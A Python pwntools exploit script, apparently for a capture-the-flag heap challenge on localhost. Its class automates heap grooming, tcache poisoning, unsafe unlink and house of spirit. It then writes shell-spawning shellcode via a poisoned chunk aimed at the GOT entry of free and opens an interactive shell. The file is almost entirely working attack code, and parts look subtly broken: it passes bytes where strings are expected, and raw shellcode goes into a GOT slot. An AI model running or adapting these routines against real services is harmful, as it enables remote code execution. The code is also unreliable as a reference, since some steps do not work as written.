#!/usr/bin/env python3
import sys
import time
import socket
import struct
from pwn import *
from tqdm import tqdm

class HeapFengShui:
    def __init__(self, host, port, binary=None):
        self.host = host
        self.port = port
        self.elf = ELF(binary) if binary else None
        self.conn = None

    def connect(self):
        self.conn = remote(self.host, self.port)

    def allocate(self, size, data='A'):
        self.conn.sendline(b'1')
        self.conn.sendline(str(size).encode())
        self.conn.sendline(data.encode())
        res = self.conn.recvline()
        return res

    def free(self, idx):
        self.conn.sendline(b'2')
        self.conn.sendline(str(idx).encode())

    def edit(self, idx, data):
        self.conn.sendline(b'3')
        self.conn.sendline(str(idx).encode())
        self.conn.sendline(data)

    def view(self, idx):
        self.conn.sendline(b'4')
        self.conn.sendline(str(idx).encode())
        return self.conn.recv(1024)

    def create_holes(self, count=20):
        pointers = []
        for i in range(count):
            self.allocate(0x80, f'hole_{i}')
            pointers.append(i)
        for i in pointers[::2]:
            self.free(i)
        return pointers

    def tcache_poisoning(self, target_addr, shellcode):
        self.create_holes(10)
        # overwrite fd pointer
        self.edit(0, p64(target_addr))
        self.allocate(0x80)  # will take one
        self.allocate(0x80)  # this will point to target
        self.edit(2, shellcode)
        self.conn.sendline(b'5')  # trigger
        return

    def unsafe_unlink(self, victim_idx, fake_chunk_addr):
        self.allocate(0x100)
        self.allocate(0x100)
        self.free(victim_idx)
        # fake chunk at victim - 0x10
        fake = p64(0) + p64(0x101)  # prev_size, size
        fake += p64(fake_chunk_addr - 0x18) + p64(fake_chunk_addr - 0x10)
        self.edit(victim_idx, fake)
        self.free(victim_idx+1)
        # now victim pointer overwritten
        self.edit(victim_idx, p64(0xdeadbeef))
        return

    def house_of_spirit(self, fake_chunk_addr, size):
        self.allocate(size, b'A'*size + p64(fake_chunk_addr))
        self.free(0)
        return

    def run_auto_exploit(self):
        self.connect()
        print("[+] Spraying tcache...")
        for _ in range(100):
            self.allocate(0x100, 'spray')
        print("[+] Creating holes...")
        holes = self.create_holes(50)
        print("[+] Attempting tcache poisoning...")
        got_free = self.elf.got['free'] if self.elf else 0x601000
        self.tcache_poisoning(got_free, asm(shellcraft.amd64.sh()))
        self.conn.interactive()

if __name__ == '__main__':
    hfs = HeapFengShui('localhost', 1337, './heap_challenge')
    hfs.run_auto_exploit()